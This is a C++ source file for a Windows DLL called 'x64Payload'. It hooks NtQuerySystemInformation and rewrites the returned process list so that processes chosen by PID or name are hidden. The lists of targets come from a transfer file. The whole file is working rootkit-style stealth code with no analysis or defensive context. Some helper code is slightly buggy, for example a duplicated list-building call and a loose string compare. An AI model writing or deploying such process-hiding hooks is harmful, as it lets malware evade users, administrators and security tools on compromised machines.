
#include "stdafx.h"

// x64Payload.cpp : Defines the exported functions for the DLL application.
//
#include "Payload.h"

#include "../NtHookEngine/NtHookEngine.h"
/*
#include <iostream>
#include <fstream>
#include <iomanip>
#include <string>
*/

#include <wchar.h>
#include <Windows.h>


using namespace std;

int *hiddenPIDsList;
TCHAR **hiddenProcessNames;
int PIDsNum, procNameNum;
bool isUp = false;


PNtQueryFunc RealNTQueryFunc,OrigAddress;



HANDLE hMutex;

/*void PrintToFile(const char* s) //just for debugging purposes
{
	wofstream f;
	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
	f << s << endl;
	f.close();
}
void PrintToFile(const TCHAR* s)
{
	wofstream f;
	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
	f << s << endl;
	f.close();
}*/

BOOL wstrcmp_ignorecase(LPCWSTR a, LPCWSTR b) //easier to implement than use existing functions
{
	int i = 0;
	TCHAR ax = a[0], bx = b[0];
	const int caseDiff = 'a' - 'A';
	while (ax != 0 && bx != 0)
	{
		if (ax == 0 || bx == 0)
			return 1;
		if (!(ax == bx || ax == bx + caseDiff || ax + caseDiff == bx))
			return 1;
		i++;
		ax = a[i]; bx = b[i];
	}
	return 0;
}
BOOL isHiddenProcess(int pID, const TCHAR *name)
{
	for (int i = 0; i < PIDsNum; i++)
	{
		if (hiddenPIDsList[i] == pID)
			return TRUE;
	}
	for (int i = 0; i < procNameNum; i++)
	{
		if (!wstrcmp_ignorecase(name, hiddenProcessNames[i]))
			return TRUE;
	}
	return FALSE;

}

PSYSTEM_PROCESS_INFO getNextElement(PSYSTEM_PROCESS_INFO spi)
{
	return (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset);
}

NTSTATUS fakeNTQuery(SYSTEM_INFORMATION_CLASS info_class, PVOID sys_info, ULONG info_length, PULONG return_length)
{
	//PrintToFile("Intercepted call!");
	if (info_class != SystemProcessInformation)
	{
		if (RealNTQueryFunc != NULL)
		{
			return RealNTQueryFunc(info_class, sys_info, info_length, return_length);
		}
		else
		{
			return -1;
		}
	}
	else
	{
		WaitForSingleObject(hMutex, INFINITE); //not sure that NtQuerySystemINformation is thread-safe, so use mutex to protect
		if (RealNTQueryFunc != NULL)
		{
			PSYSTEM_PROCESS_INFO prev_spi = NULL, spi = (PSYSTEM_PROCESS_INFO)sys_info;
			NTSTATUS x = RealNTQueryFunc(info_class, spi, info_length, return_length); //Get Process List
			if (spi == NULL)
			{
				ReleaseMutex(hMutex);
				return x;
			}
			while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
			{
				if (spi->ProcessId != 0)
				{
					if (isHiddenProcess((int)spi->ProcessId, spi->ImageName.Buffer))
					{
						if (prev_spi == NULL) //first process in list
						{
							sys_info = getNextElement(spi); //override first element
						}
						else
						{
							prev_spi->NextEntryOffset = (prev_spi->NextEntryOffset + spi->NextEntryOffset); //make previous element hide this one
						}
						//if (return_length != NULL) //TODO: research how to treat the return length correctly
						//	*return_length -= spi->NextEntryOffset;
					}
					else //boring process
					{
						prev_spi = spi;
					}
				}
				spi = getNextElement(spi); // Calculate the address of the next entry.
			}
			ReleaseMutex(hMutex);
			return x;
		}
		else
		{
			ReleaseMutex(hMutex);
			return -1;
		}
	}
}
int buildPIDsList(const TCHAR *optarg, BOOL includeSelf, int **intBuffer)
{
	//returned value - number of PIDs in list
	TCHAR str_buffer[MAX_COMMAND], *context, *pwc, *delim = L",/";
	int sizeOfIntBuffer = sizeof(int)*(int)(1 + ceil(wcslen(optarg) / (float)2));
	*intBuffer = (int *)malloc((sizeOfIntBuffer));  //maximum ints is ceil(strlen(str)/2) is each pid is a digit, plus one for self
	int i = 0;
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	if (wcslen(optarg) == 0)
		return 0;
	if (includeSelf)
	{
		(*intBuffer)[i] = (int)GetCurrentProcessId();
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int x_buffer = _wtoi(pwc);
		if (x_buffer != 0)
		{
			(*intBuffer)[i] = x_buffer;
			i++;
		}
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}
int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuffer)
{
	TCHAR *str_buffer, *context, *pwc, *delim = L",";
	int i = 0, sizeOfStrBuffer = (int)sizeof(TCHAR)*(int)(wcslen(optarg) + 1);
	if (wcslen(optarg) == 0)
		return 0;
	*outStrBuffer = (TCHAR **)malloc(sizeof(TCHAR*)*wcslen(optarg));
	str_buffer = (TCHAR *)malloc(sizeOfStrBuffer);
	wcscpy_s(str_buffer, (wcslen(optarg) + 1), optarg);
	if (includeSelf)
	{
		TCHAR tmpSelfBuffer[MAX_PATH];
		GetModuleBaseName(GetCurrentProcess(), NULL, tmpSelfBuffer, sizeof(tmpSelfBuffer));
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(tmpSelfBuffer));
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(tmpSelfBuffer)), tmpSelfBuffer);
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(pwc));
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(pwc)), pwc);
		i++;
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}

void InitializeDLL()
{
	NtHookEngineInit();
	TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE];// , hookEngLoc[MAX_PATH];
	FILE *fp;
	fopen_s(&fp, INFO_TRANSFER_FILE, "r");
	fgetws(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide
	fgetws(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide
	//fgetws(hookEngLoc, MAX_LINE, fp); //third line - location of the Hook Engine DLL
	pIDsbuff[wcslen(pIDsbuff) - 1] = '\0'; //delete \n
	procNameBuff[wcslen(procNameBuff) - 1] = '\0';
	//hookEngLoc[wcslen(hookEngLoc) - 1] = '\0';
	fclose(fp);
	PIDsNum = buildPIDsList(pIDsbuff, FALSE, &hiddenPIDsList);
	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
	//HMODULE hHookEngineDll = LoadLibrary(hookEngLoc);

	OrigAddress = (PNtQueryFunc)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	/*if (OrigAddress == NULL)
		PrintToFile("Can't get original!");
	PrintToFile("Pre-Hook");*/
	BOOL hookres = HookFunction((ULONG_PTR)OrigAddress, (ULONG_PTR)&fakeNTQuery);
	/*if (!hookres)
		PrintToFile("Can't Hook");*/
	RealNTQueryFunc = (PNtQueryFunc)GetOriginalFunction((ULONG_PTR)fakeNTQuery);
	/*if (RealNTQueryFunc == NULL)
		PrintToFile("Can't get Real Func!");
	PrintToFile("Post-Hook");*/
}
void UnhookDLL()
{
	UnhookFunction((ULONG_PTR)OrigAddress);

}
